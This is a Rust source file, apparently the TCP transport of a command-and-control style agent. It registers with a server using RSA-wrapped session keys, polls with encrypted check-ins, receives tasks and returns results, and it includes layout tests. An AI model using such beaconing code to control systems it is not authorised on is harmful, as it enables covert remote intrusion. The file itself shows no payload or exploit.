// tcp transport — plain TCP polling (matches Go agent/transport/tcp.go +
// internal/server/listener.go handleConnection). Each register/checkin opens a
// fresh connection, exchanges a packet, and closes.
//
// Register:  send Packet(TypeRegister, [4B key_len][RSA keys][AES reg])
//            receive Packet(TypeRegisterAck)
// Checkin:   send Packet(TypeCheckin, [16B agentID][8B seq BE][AES results])
//            receive Packet(TypeTask, AES tasks)

use crate::protocol::codec::{Codec, DefaultCodec};
use crate::protocol::crypto::SessionKeys;
use crate::protocol::{read_packet, write_packet, Packet, TYPE_CHECKIN, TYPE_CLOSE, TYPE_REGISTER, TYPE_REGISTER_ACK, TYPE_REQUEST_KEY, TYPE_SERVER_KEY, TYPE_TASK};
use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;

use super::TransportError;

pub struct TcpTransport {
    pub host: String,
    pub port: u16,
    pub agent_id: String,
    pub codec: Box<dyn Codec>,
    pub rsa_pub_pem: String,
    pub seq: u64,
    pub session_keys: Option<SessionKeys>,
}

impl TcpTransport {
    pub fn new(host: &str, port: u16, agent_id: &str, rsa_pub_pem: &str) -> Self {
        TcpTransport {
            host: host.to_string(),
            port,
            agent_id: agent_id.to_string(),
            codec: Box::new(DefaultCodec::new([0u8; 32], [0u8; 32])),
            rsa_pub_pem: rsa_pub_pem.to_string(),
            seq: 0,
            session_keys: None,
        }
    }

    pub fn set_codec(&mut self, c: Box<dyn Codec>) {
        self.codec = c;
    }

    pub fn reset_seq(&mut self) {
        self.seq = 0;
    }

    fn dial(&self) -> Result<TcpStream, TransportError> {
        let addr = format!("{}:{}", self.host, self.port);
        let conn = TcpStream::connect(&addr)?;
        conn.set_read_timeout(Some(Duration::from_secs(20)))?;
        conn.set_write_timeout(Some(Duration::from_secs(10)))?;
        Ok(conn)
    }

    pub fn register(&mut self, reg_json: &[u8]) -> Result<(), TransportError> {
        // If we have no compiled-in public key (CLI mode), fetch it from the
        // server first via a throwaway TypeRequestKey/TypeServerKey handshake.
        if self.rsa_pub_pem.is_empty() {
            let mut key_conn = self.dial()?;
            write_packet(&mut key_conn, &Packet::new(TYPE_REQUEST_KEY, Vec::new()))?;
            key_conn.flush()?;
            let key_resp = read_packet(&mut key_conn)?;
            if key_resp.ptype != TYPE_SERVER_KEY || key_resp.payload.is_empty() {
                return Err(TransportError::Other("key request failed".into()));
            }
            self.rsa_pub_pem = String::from_utf8_lossy(&key_resp.payload).into_owned();
        }

        // Generate session keys (32+32, RSA-encrypted together).
        let keys = SessionKeys::generate();
        let mut key_material = Vec::with_capacity(64);
        key_material.extend_from_slice(&keys.aes_key);
        key_material.extend_from_slice(&keys.hmac_key);

        let encrypted_keys =
            crate::protocol::crypto::rsa_encrypt_oaep(&self.rsa_pub_pem, &key_material)
                .map_err(TransportError::Other)?;
        let encrypted_reg = keys.encrypt(reg_json);

        // [4B key_len][RSA keys][AES reg]
        let mut payload = Vec::with_capacity(4 + encrypted_keys.len() + encrypted_reg.len());
        payload.extend_from_slice(&(encrypted_keys.len() as u32).to_le_bytes());
        payload.extend_from_slice(&encrypted_keys);
        payload.extend_from_slice(&encrypted_reg);

        let mut conn = self.dial()?;
        let reg_pkt = Packet::new(TYPE_REGISTER, payload);
        write_packet(&mut conn, &reg_pkt)?;
        conn.flush()?;

        let ack = read_packet(&mut conn)?;
        if ack.ptype != TYPE_REGISTER_ACK {
            return Err(TransportError::Other("register: unexpected ack type".into()));
        }
        // Verify ACK decrypts (proves server holds session keys).
        keys.decrypt(&ack.payload).map_err(TransportError::Other)?;

        self.codec = Box::new(DefaultCodec::new(keys.aes_key, keys.hmac_key));
        self.session_keys = Some(keys.clone());
        Ok(())
    }

    pub fn checkin(&mut self, results: Option<&[u8]>) -> Result<Vec<u8>, TransportError> {
        self.seq += 1;
        // Payload: agentID(16) + seq(8 BE) + encrypted body.
        let body = match results {
            Some(r) if !r.is_empty() => self.codec.encode(r),
            _ => Vec::new(),
        };
        let mut payload = Vec::with_capacity(24 + body.len());
        payload.extend_from_slice(self.agent_id.as_bytes());
        payload.extend_from_slice(&self.seq.to_be_bytes());
        payload.extend_from_slice(&body);

        let mut conn = self.dial()?;
        let ck = Packet::new(TYPE_CHECKIN, payload);
        write_packet(&mut conn, &ck)?;
        conn.flush()?;

        let resp = read_packet(&mut conn)?;
        if resp.ptype == TYPE_TASK {
            self.codec.decode(&resp.payload).map_err(TransportError::Other)
        } else if resp.ptype == TYPE_CLOSE {
            Err(TransportError::Other("reauth required".into()))
        } else {
            Err(TransportError::Other("checkin: unexpected packet type".into()))
        }
    }
}

#[cfg(test)]
mod tests {
    fn make_payload(agent_id: &str, seq: u64, enc_body: &[u8]) -> Vec<u8> {
        let mut p = Vec::with_capacity(24 + enc_body.len());
        p.extend_from_slice(agent_id.as_bytes());
        p.extend_from_slice(&seq.to_be_bytes());
        p.extend_from_slice(enc_body);
        p
    }

    #[test]
    fn checkin_payload_layout() {
        // Matches Go handleCheckin: agentID(16) + seq(8 BE) + encrypted body.
        let payload = make_payload("0123456789abcdef", 0x0102030405060708, &[9, 8, 7]);
        assert_eq!(payload.len(), 27);
        assert_eq!(&payload[0..16], b"0123456789abcdef");
        assert_eq!(u64::from_be_bytes(payload[16..24].try_into().unwrap()), 0x0102030405060708);
        assert_eq!(&payload[24..], &[9, 8, 7]);
    }

    #[test]
    fn register_payload_matches_go_format() {
        // [4B key_len LE][RSA keys][AES reg] — mirrors Go registerOnConn.
        let encrypted_keys = vec![0xAA; 256];
        let encrypted_reg = vec![0xBB; 48];
        let mut payload = Vec::new();
        payload.extend_from_slice(&(encrypted_keys.len() as u32).to_le_bytes());
        payload.extend_from_slice(&encrypted_keys);
        payload.extend_from_slice(&encrypted_reg);

        assert_eq!(u32::from_le_bytes(payload[0..4].try_into().unwrap()), 256);
        assert_eq!(&payload[4..260], &[0xAA; 256]);
        assert_eq!(&payload[260..], &[0xBB; 48]);
    }
}
